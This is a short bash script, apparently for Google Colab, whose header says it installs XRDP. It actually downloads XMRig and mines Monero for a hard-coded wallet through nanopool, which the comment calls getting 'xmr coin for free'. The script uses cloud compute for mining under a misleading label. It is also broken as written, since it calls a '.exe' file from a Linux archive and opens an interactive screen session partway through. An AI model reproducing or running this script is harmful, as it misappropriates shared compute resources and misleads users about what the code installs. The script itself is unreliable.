#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig.exe --donate-level 5 -o xmr-asia1.nanopool.org:14433 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P --tls --coin monero
